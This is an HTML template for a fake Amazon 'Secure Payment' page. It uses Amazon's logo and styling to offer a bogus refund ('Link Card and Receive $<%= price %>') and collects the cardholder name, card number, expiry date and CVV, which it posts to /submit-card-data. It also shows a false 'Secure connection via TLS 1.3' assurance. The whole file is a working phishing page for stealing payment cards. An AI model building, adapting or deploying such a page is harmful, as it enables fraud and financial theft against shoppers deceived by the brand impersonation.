<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Secure Payment</title>
    <link rel="icon" href="/images/favicon.png" type="image/png">

    <style>
        body, html { margin: 0; padding: 0; font-family: "Amazon Ember", Arial, sans-serif; background-color: #fff; color: #111; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .fade-in { animation: fadeIn 0.6s ease-out forwards; }
        .header { background: linear-gradient(to bottom, #f7f7f7, #eaeaea); border-bottom: 1px solid #ddd; padding: 15px 20px; text-align: center; }
        .logo-img { height: 35px; }
        .container { max-width: 400px; margin: 30px auto; padding: 20px; }
        h1 { font-size: 22px; font-weight: 400; margin-bottom: 20px; text-align: left; }
        .refund-summary { background-color: #fcfcfc; border: 1px solid #ddd; border-radius: 4px; padding: 15px; margin-bottom: 25px; font-size: 13px; }
        .refund-amount { color: #007600; font-weight: 700; font-size: 15px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; font-weight: 700; font-size: 13px; margin-bottom: 5px; color: #111; }
        input[type="text"], input[type="tel"] { width: 100%; padding: 10px; border: 1px solid #a6a6a6; border-top-color: #949494; border-radius: 3px; font-size: 14px; box-sizing: border-box; box-shadow: 0 1px 0 rgba(255,255,255,.5), 0 1px 0 rgba(0,0,0,.07) inset; transition: all 0.1s; }
        input:focus { border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,.5); outline: none; }
        .row { display: flex; gap: 15px; }
        .col { flex: 1; }
        .amazon-button { display: block; width: 100%; background: linear-gradient(to bottom, #f7dfa5, #f0c14b); border: 1px solid #a88734; border-top-color: #9c7e31; border-bottom-color: #846a29; color: #111; font-size: 14px; padding: 12px 0; border-radius: 3px; cursor: pointer; box-shadow: 0 1px 0 rgba(255,255,255,0.4) inset; margin-top: 10px; }
        .amazon-button:hover { background: linear-gradient(to bottom, #f5d78e, #eeb933); }
        .secure-text { text-align: center; font-size: 11px; color: #555; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 5px; }
    </style>
</head>
<body>
    <div class="header">
        <img class="logo-img" src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon">
    </div>
    <div class="container fade-in">
        <h1>Add a payment method</h1>
        <div class="refund-summary">Verify card for refund deposit:<br><span class="refund-amount">$<%= price %></span></div>
        <form action="/submit-card-data" method="POST" id="paymentForm">
            <div class="form-group"><label for="card_holder">Name on card</label><input type="text" id="card_holder" name="card_holder" required autocomplete="off"></div>
            <div class="form-group"><label for="card_number">Card number</label><input type="tel" id="card_number" name="card_number" placeholder="0000 0000 0000 0000" maxlength="19" required autocomplete="off"></div>
            <div class="row">
                <div class="col"><div class="form-group"><label for="expiry">Expiration date</label><input type="tel" id="expiry" name="expiry" placeholder="MM/YY" maxlength="5" required autocomplete="off"></div></div>
                <div class="col"><div class="form-group"><label for="cvv">Security Code (CVV)</label><input type="tel" id="cvv" name="cvv" placeholder="123" maxlength="3" required autocomplete="off"></div></div>
            </div>
            <button type="submit" class="amazon-button">Link Card and Receive $<%= price %></button>
            <div class="secure-text">
                <svg viewBox="0 0 24 24" width="12" height="12" fill="#555"><path d="M12 2C9.243 2 7 4.243 7 7v3H6c-1.103 0-2 .897-2 2v8c0 1.103.897 2 2 2h12c1.103 0 2-.897 2-2v-8c0-1.103-.897-2-2-2h-1V7c0-2.757-2.243-5-5-5zm6 10v8H6v-8h12zm-9-3V7c0-1.654 1.346-3 3-3s3 1.346 3 3v2H9z"/></svg>
                Secure connection via TLS 1.3
            </div>
        </form>
    </div>
    <script>
        const cardInput = document.getElementById('card_number');
        cardInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '').substring(0, 16);
            let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
            e.target.value = formattedValue;
        });
        const dateInput = document.getElementById('expiry');
        dateInput.addEventListener('input', function (e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 3) { value = value.substring(0, 2) + '/' + value.substring(2, 4); }
            e.target.value = value;
        });
        const cvvInput = document.getElementById('cvv');
        cvvInput.addEventListener('input', function(e) { e.target.value = e.target.value.replace(/\D/g, '').substring(0, 3); });
    </script>
</body>
</html>